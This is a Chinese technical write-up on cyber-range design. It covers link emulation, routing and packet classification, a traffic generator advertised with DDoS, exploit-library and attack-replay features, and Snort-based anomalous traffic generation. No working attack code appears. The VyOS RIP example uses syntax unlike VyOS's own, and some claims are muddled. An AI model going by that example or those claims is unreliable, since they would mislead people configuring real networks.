是一种网络管理技术，用于为不同类型的流量分配不同的优先级和带宽。在虚拟网络中，QoS 可以用于确保关键应用程序的带宽得到满足。</p><p>网络虚拟化技术：通过使用网络虚拟化技术，可以为不同的虚拟网络划分独立的带宽资源。这允许在同一物理网络上运行多个虚拟网络，并为它们分配不同的带宽。</p><p>流量限制策略：通过配置流量限制策略，可以为特定的虚拟机、子网或应用程序限制带宽使用。这对于控制网络资源的分配非常有用。</p><p>负载均衡：负载均衡技术可以帮助分散网络流量，从而避免某些节点或链路过载。通过动态调整流量分布，可以有效地管理带宽利用率。</p><p>流量监控和分析：网络靶场通常还会使用流量监控和分析工具来实时监测网络流量，以便及时识别和解决带宽问题。</p><p>2）常见带宽控制工具</p><p>网络靶场内，基于linux的底层操作系统模拟带宽控制使用以下三种开源的命令工具，网络靶场内内嵌带宽控制脚本，在需要调用的虚拟机镜像设置。tc（Traffic Control）：tc 是 Linux 操作系统中的一个命令行工具，用于配置和管理网络带宽、延迟、丢包等参数。它支持各种队列管理算法，如 Token Bucket、HFSC（Hierarchical Fair Service Curve）等，可用于模拟各种网络条件。NetEm：NetEm 是 Linux 内核中的一个模块，用于模拟网络延迟和丢包。它允许用户指定特定接口的延迟、带宽和丢包率等参数，从而模拟不同的网络情况。Wondershaper：Wondershaper 是一个用于 Linux 操作系统的简单的带宽控制脚本，它可以轻松地限制特定接口的带宽使用。</p><p>在网络靶场内带宽控制的应用场景</p><p>网络攻击可能会导致网络拥塞或资源耗尽，从而影响网络的性能和可用性。在网络靶场内，可以使用带宽控制来研究网络攻击的影响。可以使用基于流的带宽控制来模拟网络攻击对关键业务流量的影响。这样，可以让网络安全人员了解网络攻击对网络性能和可用性的影响，从而制定有效的防御措施。</p><p>以下是一些具体应用场景：</p><p>模拟网络拥塞</p><p>在网络靶场内，可以使用基于流的带宽控制来限制某些流类型或应用程序的带宽，从而模拟网络拥塞。例如，可以限制视频流的带宽，从而模拟视频会议时网络拥塞的情况。</p><p>在网络靶场内，可以使用基于路由的带宽控制来模拟网络拥塞。例如，可以增加网络路径的延迟，从而模拟网络拥塞的情况。</p><p>研究网络攻击的影响</p><p>在网络靶场内，可以使用基于流的带宽控制来模拟网络攻击对关键业务流量的影响。例如，可以限制数据库连接的带宽，从而模拟数据库攻击对网络性能的影响。</p><p>在网络靶场内，可以使用基于路由的带宽控制来模拟网络攻击对网络路径的影响。例如，可以增加网络路径的丢包率，从而模拟网络攻击对网络可用性的影响。</p><p>进行网络安全培训</p><p>在网络安全培训中，可以使用基于流的带宽控制来模拟网络攻击对网络安全的影响。例如，可以限制防火墙的带宽，从而模拟网络攻击对防火墙的绕过。</p><p>在网络安全培训中，可以使用基于路由的带宽控制来模拟网络攻击对网络安全的影响。例如，可以增加网络路径的延迟，从而模拟网络攻击对网络安全的影响。</p><p><strong>路由协议仿真</strong></p><p>路由协议的概念</p><p>路由协议是用于计算网络中路由器之间的路由表的协议。路由表中记录了网络中的路由信息，包括路由的源地址、目的地址、下一跳地址和带宽。</p><p>路由协议可以分为两类：</p><p>距离向量协议：距离向量协议是基于距离向量的路由协议。距离向量协议中的路由表项包含了到目的地址的距离和下一跳地址。距离向量协议中的路由器会定期向相邻路由器发送路由更新信息。</p><p>链路状态协议：链路状态协议是基于链路状态的路由协议。链路状态协议中的路由表项包含了到目的地址的距离、下一跳地址和链路状态。链路状态协议中的路由器会周期性地发送链路状态信息。</p><p>虚拟网络支撑模块主要包括两部分，网络协议构建器和网络协议分析器。功能主要包括过滤规则设置，报文捕获，报文分析与统计，协议参数输入与报文构造，报文发送和协议配合工作过程分析等。支持多种网络协议服务模拟。</p><p>支持虚拟机和容器多网卡的仿真，支持对指定虚拟链路的详细特性进行配置，包括链路带宽、延迟和丢包率等，用于模拟相关区域的网络实际情况；支持路由器的仿真功能，路由器仿真具备真实路由系统，支持RIP、OSPF、BGP和MPLS，可支持配置多种VPN协议，如IPsec和OpenVPN。还支持VXLAN协议，并与实物路由器实现互联互通。除此之外，它还提供数据交换和网络隔离功能，可为构建的虚拟网络自动构建DHCP服务，为虚拟节点分配IP，并支持指定虚拟节点的MAC和IP。</p><p>协议报文参数编辑：协议报文参数编辑模块针对每一个协议提供参数的配置，可以按协议的格式和字节顺序来编辑输入协议的参数，后台逻辑完成数据格式和字节顺序的转换工作。</p><p>报文构造与发送：报文构造与发送模块根据用户输入编辑输入的协议参数，自动构造相应的协议报文，并将构造好的报文通过网络发送出去。系统支持的协议报文包括有：数据链路层的以太网帧和PPPOE帧；网络层的IP、ARP/PARP、ICMP等协议，传输层的TCP和UDP；以及常用的路由协议报文（RIP、OSPF、BGP等）。还可以处理IP和TCP等协议报文中的选项。</p><p>VyOS 的路由协议支持</p><p>VyOS是一个基于Debian Linux的开源路由器和防火墙操作系统。它具有强大的网络功能，包括路由、VPN、防火墙、QoS等。VyOS支持多种路由协议，如BGP、OSPF、RIP等，这使得它成为模拟网络协议的理想选择。</p><p>以下是一个使用 VyOS 来模拟 RIP 协议的示例：</p><p>1.在网络靶场中部署两个 VyOS 路由器，分别命名为 R1 和 R2。</p><p>2.在 R1 上配置 RIP 协议：</p><p>router rip</p><p>network 192.168.1.0</p><p>network 192.168.2.0</p><p>3.在 R2 上配置 RIP 协议：</p><p>router rip</p><p>network 192.168.2.0</p><p>network 192.168.3.0</p><p>4.使用 ping 命令来测试 R1 和 R2 之间的路由：</p><p>ping 192.168.2.2</p><p>通过对 VyOS 路由协议的支持，网络靶场可以更加逼真地模拟真实的网络环境，从而帮助网络安全人员进行网络安全培训和攻防演练。</p><p>以下是一些需要注意的问题：</p><p>在网络靶场内部署 VyOS 路由器时，需要考虑路由器的性能和可用性。</p><p>在配置 VyOS 路由协议时，需要注意路由协议的参数设置。</p><h5 id="报文分类"><a href="#报文分类" class="headerlink" title="报文分类"></a>报文分类</h5><h6 id="基于特征的报文分类"><a href="#基于特征的报文分类" class="headerlink" title="基于特征的报文分类"></a>基于特征的报文分类</h6><p>报文的特定特征可以包括：</p><p>报文的源地址和目的地址</p><p>报文的端口号</p><p>报文的协议类型</p><p>报文的流量特征（例如，流量大小、流量速率）</p><h6 id="基于机器学习的报文分类"><a href="#基于机器学习的报文分类" class="headerlink" title="基于机器学习的报文分类"></a>基于机器学习的报文分类</h6><p>这种方案是使用机器学习算法来进行报文分类。机器学习算法可以根据大量的训练数据来学习报文的分类规律。</p><h6 id="基于混合方式的报文分类"><a href="#基于混合方式的报文分类" class="headerlink" title="基于混合方式的报文分类"></a>基于混合方式的报文分类</h6><p>这种方案是将上述两种方案结合起来使用。例如，可以使用基于特征的报文分类来进行初步分类，然后使用基于机器学习的报文分类来进行细粒度的分类。</p><h6 id="具体实施方案"><a href="#具体实施方案" class="headerlink" title="具体实施方案"></a>具体实施方案</h6><p>根据网络靶场的具体需求，可以选择合适的技术方案。例如，如果需要对报文进行细粒度的分类，可以选择基于机器学习的报文分类方案。如果需要实时处理大量流量，可以选择基于特征的报文分类方案。</p><p>报文分类是网络靶场的重要功能，可以帮助网络安全人员进行网络安全培训和攻防演练。在选择报文分类技术方案时，需要综合考虑网络靶场的具体需求、准确性要求和性能要求。</p><p>以下是一些常用的报文分类技术方案的具体介绍：</p><p>基于特征的报文分类</p><p>基于协议的报文分类：根据报文的协议类型来进行分类。例如，可以将所有 HTTP 报文分为一类，将所有 TCP 报文分为一类。</p><p>基于流量的报文分类：根据报文的流量特征来进行分类。例如，可以将流量大小超过一定阈值的报文分为一类，将流量速率超过一定阈值的报文分为一类。</p><p>基于应用的报文分类：根据报文的应用类型来进行分类。例如，可以将所有 Web 应用的报文分为一类，将所有游戏应用的报文分为一类。</p><p>基于机器学习的报文分类</p><p>支持向量机：支持向量机是一种常用的机器学习算法，可以用于分类和回归问题。</p><p>决策树：决策树是一种简单易用的机器学习算法，可以用于分类和回归问题。</p><p>神经网络：神经网络是一种强大的机器学习算法，可以用于分类和回归问题。</p><p>报文捕获根据指定的过滤规则，实时的捕获满足条件的网络报文，可配置报文的过滤规则，设定捕获特定类型的数据包，包过滤操作在系统内核空间进行，极大地提高了捕获的效率。</p><p>端口和协议识别：</p><p>这是一种基本的报文分类方法，它通过检查报文中的目标端口和传输协议来确定流量类型。例如，TCP端口80通常用于HTTP流量，端口443用于HTTPS。这种方法适用于识别一些常见的应用和服务，但无法处理加密流量或自定义端口。</p><p>深度报文检测（DPI）：</p><p>DPI是一种高级的报文分类技术，它通过深入分析报文内容来确定流量类型。识别加密流量，因为它不仅仅依赖于端口信息。DPI使用特征匹配、正则表达式等技术来识别应用层协议和应用程序。这是一种强大的方法，可以对广泛的流量进行分类，但也需要更多的计算资源。</p><p>基于流的分类：</p><p>基于流的分类方法将一组相关报文组合在一起，然后根据流的行为进行分类。这种方法可以捕获与特定应用程序或连接相关的所有报文，并进行更准确的分类。例如，可以将所有与Skype通话相关的报文组合在一起，并将其识别为Skype流量。</p><p>机器学习和AI：</p><p>机器学习和人工智能（AI）在报文分类方面表现出色。这些技术可以分析大量的历史流量数据，并学习识别不同应用程序和流量类型的模式。一旦训练完成，它们可以自动分类新流量。这使得它们能够适应新兴应用和变化的网络环境。</p><p>网络流分析工具：</p><p>有一些专门的网络流分析工具，如Wireshark、tcpdump和Bro（现在称为Zeek），它们可以用于报文分类。这些工具提供了详细的流量分析功能，可以帮助网络管理员深入了解网络中的流量模式和特征。</p><p>签名和规则引擎：</p><p>这种方法使用已知的应用程序或威胁的特征签名或规则来识别流量。例如，入侵检测系统（IDS）使用这种方法来检测已知的攻击模式。这对于特定应用程序和威胁的分类非常有效，但无法处理未知的流量。</p><h5 id="带宽、延迟、丢包仿真"><a href="#带宽、延迟、丢包仿真" class="headerlink" title="带宽、延迟、丢包仿真"></a>带宽、延迟、丢包仿真</h5><h6 id="带宽仿真技术方案"><a href="#带宽仿真技术方案" class="headerlink" title="带宽仿真技术方案"></a>带宽仿真技术方案</h6><p>基于流量的带宽仿真：根据报文的流量特征来进行带宽限制。例如，可以将流量大小超过一定阈值的报文限制为特定的带宽。</p><p>基于路由的带宽仿真：根据路由表来进行带宽限制。例如，可以将某些路径的带宽限制为特定的值。</p><p>基于硬件设备的带宽仿真：使用硬件设备来实现带宽限制。例如，可以使用防火墙或交换机来限制带宽。</p><h6 id="延迟仿真技术方案"><a href="#延迟仿真技术方案" class="headerlink" title="延迟仿真技术方案"></a>延迟仿真技术方案</h6><p>基于路由的延迟仿真：根据路由表来进行延迟增加。例如，可以将某些路径的延迟增加为特定的值。</p><p>基于硬件设备的延迟仿真：使用硬件设备来实现延迟增加。例如，可以使用防火墙或交换机来增加延迟。</p><p>基于软件的延迟仿真：使用软件来实现延迟增加。例如，可以使用网络模拟器来增加延迟。</p><h6 id="丢包仿真技术方案"><a href="#丢包仿真技术方案" class="headerlink" title="丢包仿真技术方案"></a>丢包仿真技术方案</h6><p>基于流量的丢包仿真：根据报文的流量特征来进行丢包。例如，可以将流量大小超过一定阈值的报文丢弃。</p><p>基于路由的丢包仿真：根据路由表来进行丢包。例如，可以将某些路径的丢包率设置为特定的值。</p><p>基于硬件设备的丢包仿真：使用硬件设备来实现丢包。例如，可以使用防火墙或交换机来丢弃报文。</p><h3 id="流量仿真模块"><a href="#流量仿真模块" class="headerlink" title="流量仿真模块"></a>流量仿真模块</h3><p>提供了第2层到第7层的流量生成与分析功能，结合高效的网络仿真和应用流量生成能力，支持功能测试、性能评估、网络安全检查和基准测试，以满足汽车虚拟网络管理系统中的流量仿真需求。</p><h4 id="功能实施方案-5"><a href="#功能实施方案-5" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>提供的该工具信息如下：</p><p>品牌：国利</p><p>型号：GLFLowtt</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>针对端口线速的要求，该流量仿真模块提供了6个测试端口，其中4个10GESFP+接口兼容1/10G速率模式，2个QSFP28接口兼容1/10/25G速率模式。此外，还有2个10/100/1000M自适应网口用于管理，满足了不同速率端口的测试需求。</li><li>该模块采用机架式结构，方便集成和部署，满足了对设备紧凑性和可扩展性的需求。</li><li>在供电方面，该模块支持交流电压供电，电压范围为220V±10%，频率范围为50Hz±5%，保证了设备在各种电力条件下都能稳定运行。</li><li>该模块采用基于B/S架构的管理方式，支持多用户同时连接，提高了管理效率和资源利用率。</li><li>该模块支持RFC 2544吞吐测试、丢包率测试、时延测试以及背靠背测试，能够全面评估被测设备的性能。</li><li>该模块支持RFC 2889地址缓存容量测试和地址学习速率测试，能够帮助评估被测设备的地址处理能力。</li><li>模块还支持RFC 3511 HTTP/TCP并发、新建、吞吐测试。这些测试可以帮助评估HTTP/TCP协议在网络环境中的性能表现，包括并发连接数、新建连接速度以及吞吐量等关键指标。通过这些测试，可以更好地了解网络设备的处理能力和瓶颈，并进行相应的优化。</li><li>该模块支持RFC 4445 RTSP/RTP/RTCP播放质量测试、播放并发测试、播放吞吐测试，能够模拟实际网络中的流量，评估被测设备的处理能力。</li><li>该模块支持协议模拟包含常见互联网协议ARP、TCP、UDP、HTTP、HTTPS、LDAP、IPoE、DHCP、DNS、PostgreSQL、SMTP等，能够模拟各种实际网络场景进行测试和分析。</li><li>该模块支持视频协议模拟如RTSP/RTCP/RTP、H.264等，能够模拟视频流并进行相关性能测试和分析。</li><li>该模块支持组播协议模拟如含IGMP，MLD等，这有助于用户进行组播流量的模拟和性能测试。</li><li>该模块支持动态路由协议模拟如RIPv1/v2，OSPFv2等，为用户提供了对路由协议的性能测试和分析能力。</li><li>该模块支持工业互联网协议模拟包括但不限于BACnet，Omron，OPC_UA，Profinret以及Siemens S7等不少于20种工业互联网协议，为用户提供了广泛的协议支持，使得用户能够模拟各种工业网络场景进行测试和分析。</li><li>该模块支持车载以太网协议模拟如DOIP,SOMEIP等，这为用户提供了对车载以太网流量的模拟和性能测试能力。</li><li>该模块支持对上述类别协议数据包的构建、捕获与解析。该模块能够模拟各种网络协议的数据包，进行构建、捕获和解析，以便进行流量仿真和测试。</li><li>该模块的模拟协议覆盖层次为L2-L7，能够模拟不同层次的协议行为，覆盖了从数据链路层到应用层的协议层次，全面模拟不同层次的协议行为，为用户提供全面的流量仿真和测试能力。</li><li>该模块支持IPv4和IPv6网络，能够模拟和测试不同版本的IP协议，能够模拟IPv4和IPv6网络的流量和行为，帮助用户评估网络设备的IPv4和IPv6兼容性和性能。在网络中的行为和性能。</li><li>该模块支持多种被测设备类型，包括路由器、交换机、防火墙、负载均衡、日志审计和服务器等，以便对不同设备进行流量仿真和性能测试。可以在该模块中对不同类型的网络设备进行测试，评估其性能和功能。</li><li>该流量仿真模块支持国密算法HTTPS性能测试和国密算法VPN测试，符合国家密码管理局的相关标准，能够满足用户对国密算法网络安全的需求。</li><li>该模块支持加密套件ECC-SM4-SM3，这是一种基于椭圆曲线密码体制的加密算法，具有较高的安全性，能够满足用户对高强度加密的需求。</li><li>该模块的SSL协议同时支持RSA和国密算法，为用户提供了灵活的加密选择，既可以使用传统的RSA算法，也可以选择国密算法进行加密。</li><li>对于IPSec VPN和SSL VPN的性能测试，该模块支持国密新建、并发和吞吐性能测试，以及SSL VPN国密并发测试。可以在该模块中全面评估VPN的性能和安全性，包括国密算法的测试选项。</li><li>模块还支持DDoS攻击探测和模糊测试、安全检测评估、漏洞扫描以及攻击报文重放等功能。该模块具备强大的安全测试功能，可以帮助用户发现网络设备的安全漏洞和弱点，并提供相应的解决方案和建议。</li><li>该模块的DDoS攻击类型大于80种，能够应对多种不同类型的DDoS攻击。同时，DDoS攻击报文长度可设置，可以根据实际需求进行灵活配置。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ef4eb592afb385438268b251348f2075.png" alt="1705464410237"></p><p>报文设置</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/14b02b06b958674c9a0dc1a733fb7e08.jpeg" alt="2030ab1c7d70f0069f6e82be695e831b"></p><p>ddos工具攻击图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2f4cc86744e3e0d34f13d6d9f169f533.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7b8cf92e8c9d312b5c8dd5237a516ffb.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0b6d331b3580a3d5ac7fb65e919a1b50.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/91c59bf7a7a0a899c57ea550113b0115.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0d04447af2b994ef5159ef1283c1232b.png"></p><p>82种DDoS攻击类型</p><ol><li>模块拥有庞大的漏洞数据利用库，其中漏洞数量不少于11万个，涵盖了主流漏洞库中的漏洞以及部分针对车联网业务的漏洞。该模块为用户提供了全面的漏洞数据利用库，满足用户对不同漏洞的测试需求，这为用户提供了全面的漏洞信息，有助于用户及时发现并修复安全漏洞。</li><li>该模块支持漏洞数据利用库的在线或离线更新，提供特征库更新频率为一周。可以随时获取最新的漏洞信息和特征库，并进行准确的漏洞扫描和测试，保持系统的安全性和时效性。</li><li>该模块的攻击库攻击报文不少于1万个，涉及HTTP、HTTPS、UDP、SMTP、Microsoft、MySQL、Oracle、DNS等攻击类型。这为用户提供了丰富的攻击样本，有助于用户模拟各种实际网络攻击场景进行测试和分析。</li><li>该模块具备攻击计数器功能，能够统计攻击率、攻击吞吐量等参数。此外，用户还可以上传自己的攻击流量进行测试。通过该模块的攻击计数器功能，可以方便地统计和分析攻击流量相关参数，包括攻击率、攻击吞吐量等。同时，用户还可以上传自己的攻击流量进行测试，以便更好地评估网络设备的防御能力和响应能力。</li><li>能够混合攻击流量和正常流量，实现在发送50%的正常背景流的同时重放攻击报文的功能。可以模拟真实的网络环境，将正常流量与攻击流量混合在一起进行测试，以评估网络设备的防御能力和处理能力。</li><li>该模块能够监控被测设备对攻击结果的判断能力。通过实时监控被测设备的反应和判断能力，可以全面了解设备的防御能力和响应能力。这有助于用户发现潜在的安全风险和问题，并提供相应的解决方案和建议。</li><li>该模块能够模拟百万级用户同时进行业务操作，并对每个用户的操作进行统计和报告。通过模拟大规模用户操作并进行统计报告的功能，可以更好地了解网络设备的性能和可靠性。这有助于用户进行大规模的网络规划和部署决策。</li></ol><h4 id="性能实施方案-5"><a href="#性能实施方案-5" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>该流量仿真模块具备强大的新建会话处理能力，能够实现每秒新建HTTP会话260万，满足高并发新建会话的测试需求。这一功能确保了测试环境中的高并发新建会话场景能够得到充分模拟，为评估系统性能提供了有力支持。</li><li>该模块支持高达6400万的最大HTTP并发会话，可满足大规模并发会话的测试需求，保证测试场景的覆盖全面。这一特性使得该模块适用于对大规模并发会话处理能力进行测试的场景，有助于全面评估系统的并发性能。</li><li>该模块的HTTP最大吞吐速率达到120G，能够模拟高带宽的网络环境，为高速数据传输的测试提供有力支持。这一吞吐速率确保了高带宽数据传输场景下的性能测试需求得到满足，有助于评估系统在高带宽环境下的性能表现。</li><li>在HTTPS新建会话方面，该模块每秒能够处理5.6万的新建会话，表现出较高的加密会话处理能力，满足加密场景下的测试需求。这一加密会话处理能力确保了加密场景下的性能测试需求得到满足，为评估系统在加密会话处理方面的性能提供了有力支持。</li><li>对于使用国密套件的HTTPS新建会话，该模块每秒能够处理3万，显示出对国密算法的支持和优化，符合国家加密标准的要求。这一特性表明该模块在国密算法方面进行了优化和支持，符合国家加密标准的要求，为特殊加密场景提供了专业的测试支持。</li><li>该模块支持高达224万的HTTPS最大并发会话，能够应对大规模的加密会话需求，确保测试结果的准确性和可靠性。这一特性使得该模块适用于对大规模加密会话处理能力进行测试的场景，有助于确保测试结果的准确性和可靠性。</li><li>无论是常规的HTTPS还是使用国密套件的HTTPS，该模块的最大并发会话都能达到224万，保证了测试的准确性和可靠性，为各种加密场景提供全面的测试支持。这一特性表明该模块适用于各种加密场景的测试需求，确保了测试的全面性和准确性。</li><li>该模块的HTTPS最大吞吐速率可以达到80G，确保了高带宽加密数据传输的模拟测试，满足加密场景下的高吞吐量测试需求。这一吞吐速率确保了高带宽加密数据传输场景下的性能测试需求得到满足，有助于评估系统在加密数据传输方面的性能表现。</li><li>对于使用国密套件的HTTPS，其最大吞吐速率也能达到7.7G，满足了国密算法的性能测试需求，为特殊加密场景提供专业的测试支持。这一特性表明该模块在国密算法方面进行了优化和支持，满足了特殊加密场景下的性能测试需求，为专业测试提供了有力支持。</li><li>在RFC UDP吞吐率方面，该模块可以实现双向64字节的195G吞吐率，满足UDP流量仿真的高吞吐需求，为UDP场景下的性能测试提供有力支持。这一吞吐率确保了UDP流量仿真场景下的高性能测试需求得到满足，有助于评估系统在UDP通信方面的性能表现。</li><li>在TCP新建连接方面，该模块每秒可以处理高达410万的新建连接请求，满足高并发连接场景下的测试需求。这一连接处理能力确保了高并发连接场景下的性能测试需求得到满足，有助于评估系统在高并发连接处理方面的性能表现。</li><li>该模块可以支持高达6400万的TCP最大并发连接，满足了大规模并发连接的测试需求，确保测试场景的覆盖全面。这一特性使得该模块适用于对大规模并发连接处理能力进行测试的场景，有助于全面评估系统的并发连接处理能力。</li><li>该模块的TCP最大吞吐速率可以达到双向140G，确保了高带宽数据传输的模拟测试，满足TCP场景下的高吞吐量测试需求。这一吞吐速率确保了高带宽数据传输场景下的性能测试需求得到满足，有助于评估系统在高带宽数据传输方面的性能表现。</li></ol><h4 id="技术实现内容-5"><a href="#技术实现内容-5" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="流量产生架构"><a href="#流量产生架构" class="headerlink" title="流量产生架构"></a>流量产生架构</h5><p>功能参数设计方面，系统具备强大的测试和模拟能力，支持多种网络设备和协议的仿真。系统提供6个测试端口，包括4个10GE SFP+接口兼容1/10G速率模式，2个QSFP28接口兼容1/10/25G速率模式，以及2个10/100/1000M自适应网口用于管理。系统采用机架式结构形式，并通过交流电压供电。系统基于B/S架构的管理方式，支持多用户同时连接。系统还支持RFC 2544吞吐测试、丢包率测试、时延测试以及背靠背测试，以满足各种网络性能测试需求。此外，系统还支持RFC 2889地址缓存容量测试和地址学习速率测试，RFC 3511 HTTP/TCP并发、新建、吞吐测试，以及RFC 4445 RTSP/RTP/RTCP播放质量测试、播放并发测试、播放吞吐测试。系统还支持模拟多种常见互联网协议和工业互联网协议，包括ARP、TCP、UDP、HTTP、HTTPS、LDAP、IPoE、DHCP、DNS、PostgreSQL、SMTP等。此外，系统支持视频协议模拟，如RTSP/RTCP/RTP和H.264，以及组播协议模拟，如含IGMP和MLD。系统还能够模拟动态路由协议，如RIPv1/v2和OSPFv2，以及工业互联网协议，包括BACnet、Omron、OPC_UA、Profinret、Siemens S7等20种工业互联网协议。此外，系统还支持车载以太网协议模拟，如DOIP和SOMEIP，并能够对上述类别协议数据包进行构建、捕获和解析，覆盖层次从L2到L7。系统同时支持IPv4和IPv6网络，并能够测试各种被测设备类型，包括路由器、交换机、防火墙、负载均衡、日志审计、服务器等。此外，系统还支持国密算法HTTPS性能测试和国密算法VPN测试，包括ECC-SM4-SM3加密套件，同时支持RSA和国密算法的SSL协议。系统还支持IPSec VPN国密新建、并发、吞吐性能测试，以及SSL VPN国密并发测试。此外，系统还支持DDoS攻击探测和模糊测试、安全检测评估、漏洞扫描以及攻击报文重放，包括不少于80种DDoS攻击类型和11万个漏洞数据利用库漏洞。系统能够实现攻击计数器功能，统计攻击率、攻击吞吐量等参数，并支持上传自定义攻击流量。系统还可以混合攻击流量和正常流量，以测试受测设备的攻击探测能力，并监控被测设备的攻击结果判断。最后，系统能够模拟百万级用户同时进行业务操作，并对每个用户的操作进行统计和报告，以满足各种测试需求。</p><p>性能参数要求方面，HTTP每秒新建会话达到260万，最大并发会话达到6400万，最大吞吐速率达到120G。HTTPS每秒新建会话为5.6万（国密套件为3万），最大并发会话为224万（国密套件为224万），最大吞吐速率为80G（国密套件为7.7G）。RFC UDP吞吐率（双向64字节）为195G，TCP每秒新建连接为410万，最大并发连接为6400万，TCP最大吞吐速率（双向）为140G。这些性能参数的设计确保了系统在高负载和复杂网络环境下的出色性能表现，满足了广泛的测试需求。</p><p>下图为网络靶场的体系结构图。该靶场上部署了流量产生器，提供模拟整个网络活动的能力，产生代表性的网络流量。同时，该靶场还能够模拟各种人员角色（系统用户、管理员、对手和中立人员等），提供靶场各节点上人类行为的模拟能力，可产生人类之间真实的系列事件，靶场中的角色可以驱动和运行桌面环境中的各种应用程序，可与验证系统进行交互，如身份认证系统等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7b3eed7c286251fe1fd9a757758b2fdc.png"></p><p>流量产生器在网络靶场位置</p><p>通过使用系统管理员模拟训练系统来模拟目标环境。靶场内含一个网络流量合成套件，其中的多用户流量工具插件部署在网络流量合成套件之上以描述用户，并产生行为仿真。MUTT合成了电子邮件客户、网页客户和SSH客户等的行为流量。该能力非常适合于测试安全装备和训练边界防护技术人员。</p><p>网络流量特征分析建模及流量生成和高逼真多样化用户行为模拟。其中流量的生成是构建高逼真网络靶场的基础。由于真实网络环境中，异常流量的存在不容忽视。所以在网络靶场流量生成中，异常流量也必须考虑。</p><h5 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h5><p>针对研究目标，文章从异常流量时空特征出发，借助Snort规则库，建立其解析机制以构造数据报文，刻画异常流量空间特征；同时使用不同的时间分布模型计算数据包</p><p>发送时间间隔，刻画异常流量时间特性。通过此时间间隔控制数据包发送过程，产生符合时空特性的网络异常流量。最后设计并开发网络异常流量生成演示系统并验证实验生成流量的有效性。具体研究内容如：</p><p>（1）网络异常流量生成框架设计。网络流量生成框架设计是本论文研究的基础。本文通过对网络异常流量进行分析，从空间和时间角度提取出网络协议头、数据包负载和数据包发送时间间隔三个特征，设计了基于时空模型的网络异常流量生成框架，并对框架中的特征翻译模块、数据包构造模块和流量生成模块及每个模块的组成单元进行具体描述。</p><p>（2）基于时空模型的网络异常流量生成机制实现。该机制中，特征翻译模块和数据包构造模块构成空间模型部分。Snort规则库给出了网络异常流量的空间特征，省去了人工提取特征的过程。但是Snort规则库是一般以文本形式给出，文本内容是均以Snort文法规则描述。特征翻译模块设计了一种基于文法识别工具ANTLR 的Snort规则解析机制，识别其各个特征字段及取值，存储至规则结构体。数据包构造模块读取该结构体，获得特征字段取值，构造异常流量数据包。流量生成模块根据不同网络异常流量的特性，使用不同的时间分布模型计算数据包发送间隔，并控制数据包的发送过程，最终形成网络异常流量。</p><p>（3）异常网络流量生成演示系统开发与流量验证。根据Snort规则翻译机制以及数据包时间特征，设计开发异常网络流量生成演示系统。同时对生成的流量进行时空特性的检验，验证流量的有效性。</p><h5 id="流量特性"><a href="#流量特性" class="headerlink" title="流量特性"></a>流量特性</h5><p>流量特征在网络异常流量检测中具有重要作用。可以通过检测IP报头，提取其中的源IP地址，轻易识别来自非法IP的连接请求。通过提取TCP报文头部中的各标志位，对比合法标志位集合，判断某数据包TCP标志位组合的合法与否。通过搜索特征字符附近内容来识别含有特殊病毒信息的Email。通过统计分析某个命令在特定时间段内发生的次数，对比预设阈值，判断是否发生DoS攻击。</p><p>网络异常流量特征的范围覆盖很广，有简单的协议头部字段识别和载荷识别，也有复杂的数据包时间间隔判断和多协议多特征综合判断。概括起来可以从空间和时间角度，使用网络协议头、负载信息和数据包发送时间间隔三个特征对网络异常流量进行描述。</p><p>（1）网络协议头 TCP/IP协议族是Internet的基础，它为网络设备提供连接的同时，也为网络攻击的实施提供了平台。由于在设计TCP/IP协议族协议时考虑不够周全，给了网络攻击以可趁之机。对这些协议的漏洞利用而产生的流量一般可以通过数据包头部的各项字段显示出来。因此可以通过对IP、TCP、UDP和ICMP这四种常见协议头部各字段进行分析，提取能够表征某种攻击特征的字段，描述该种网络攻击流量特征。以IP数据包为例，一般检测器源宿IP地址，协议类型以及分片标志位等字段。</p><p>（2）负载信息 有些攻击是基于内容的，这类攻击产生的流量特征一般不会体现在网络协议头部字段。描述这类攻击产生的流量特征一般从其网络数据包负载入手，分析提取负载信息的关键信息。针对某种特定攻击，其负载信息一般会存在符合某种规律的特殊字符串，可以利用这个特殊字符串来描述该种攻击流量特征。如缓冲区溢出在实现时依赖特殊的填充数据、shellcode字段以及返回地址等，这些特殊构造的数据都会以数据包负载的形式体现。</p><p>（3）数据包发送时间间隔</p><p>很多攻击流量特征并不是从一两个数据包上体现出来的，而是通过一段时间内该种数据包的统计特征来体现，这种统计特征表现在数据包发送速率上。如拒绝服务攻击需要持续不断地发送数据包，达到拒绝服务的目的，因而其发送频率非常快，统计特征一般会远远超过设定阈值；扫描攻击为了躲避检测，会降低扫描速率，但从一个较长的时间尺度来看，其时间也会体现出某种特征，最为常见的就是周期性特征。采用Snort规则库作为异常流量特征库，具体原因如下：</p><p>（1）丰富性。Snort规则库在入侵检测中扮演着重要角色，其基本原理是根据入侵描述信息对捕获的网络数据包进行搜索和匹配，检测网络攻击。Snort规则库目前能够识别包括拒绝服务攻击，扫描攻击，Web攻击，缓冲区溢出攻击等在内的多种形式的攻击，满足对生成异常流量种类丰富性的需求。同时Snort规则库一直由官方开发团队和社区维护更新，不断地丰富着网络攻击特征库。</p><p>（2）开源性，可扩展性。Snort规则的开源特性使得其获取途径十分方便。Snort规则语法简单，根据其语法规则能够很容易写出新的攻击